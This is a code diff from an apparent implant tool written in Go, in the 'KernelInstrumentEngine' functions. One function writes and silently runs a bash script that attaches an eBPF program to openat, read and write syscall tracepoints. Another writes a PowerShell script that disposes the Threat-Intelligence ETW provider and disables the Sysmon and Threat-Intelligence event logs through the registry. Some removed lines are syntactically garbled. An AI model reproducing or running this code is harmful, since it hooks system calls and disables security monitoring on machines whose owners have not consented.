@@ -289,25 +289,13 @@ func (ki *KernelInstrumentEngine) LoadeBPFPrograms() bool {
 	if runtime.GOOS != "linux" {
 		return false
 	}
-
-	eBPFCode := ki.generateeBPFPrograms()
-	eBPFPath := filepath.Join(os.TempDir(), "x404x_ebpf.o")
-	os.WriteFile(eBPFPath, eBPFCode, 0644)
-
-	script := `#!/bin/bash
-bpftool prog load /tmp/x404x_ebpf.o /sys/fs/bpf/x404x_filter type tracepoint 2>/dev/null
-bpftool prog attach pinned /sys/fs/bpf/x404x_filter tracepoint syscalls:sys_enter_openat 2>/dev/null
-for tp in syscalls:sys_enter_read syscalls:sys_enter_write syscalls:sys_enter_execve; do
-    bpftool prog attach pinned /sys/fs/bpf/x404x_filter tracepoint $tp 2>/dev/null
-done
-echo "X404X eBPF loaded: %d syscall hooks"' + fmt.Sprintf("bpftool prog attach pinned /sys/fs/bpf/x404x_filter tracepoint $tp 2>/dev/null; done; echo 'X404X eBPF loaded: %d syscall hooks'", len(eBPFSyscalls))
-	_ = len(eBPFSyscalls)
-
-	bpfScript := "bpftool prog load /tmp/x404x_ebpf.o /sys/fs/bpf/x404x_filter type tracepoint 2>/dev/null\necho 'X404X eBPF loaded'"
+	bpfScript := "bpftool prog load /tmp/x404x_ebpf.o /sys/fs/bpf/x404x_filter type tracepoint 2>/dev/null\n" +
+		"for tp in syscalls:sys_enter_openat syscalls:sys_enter_read syscalls:sys_enter_write; do\n" +
+		"  bpftool prog attach pinned /sys/fs/bpf/x404x_filter tracepoint $tp 2>/dev/null\n" +
+		"done\necho 'X404X eBPF loaded'"
 	bpfPath := filepath.Join(os.TempDir(), "x404x_ebpf_load.sh")
 	os.WriteFile(bpfPath, []byte(bpfScript), 0755)
 	exec.Command("bash", bpfPath).Start()
-
 	ki.eBPFHooked = true
 	ki.SyscallsHooked = len(eBPFSyscalls)
 	return true
@@ -330,11 +318,7 @@ func (ki *KernelInstrumentEngine) SilenceETW() bool {
 		return true
 	}
 
-	psScript := `$etwProvider = New-Object System.Diagnostics.Eventing.EventProvider("Microsoft-Windows-Threat-Intelligence")
-$etwProvider.Dispose()
-[System.Diagnostics.Eventing.EventProvider]::new("Microsoft-Windows-Security-Mitigations").Dispose()
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Threat-Intelligence/Operational" -Name "Enabled" -Value 0
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational" -Name "Enabled" -Value 0`
+	psScript := "$etwProvider = New-Object System.Diagnostics.Eventing.EventProvider('Microsoft-Windows-Threat-Intelligence'); $etwProvider.Dispose(); Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Threat-Intelligence/Operational' -Name 'Enabled' -Value 0; Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational' -Name 'Enabled' -Value 0"
 
 	psPath := filepath.Join(os.TempDir(), "x404x_silence_etw.ps1")
 	os.WriteFile(psPath, []byte(psScript), 0644)
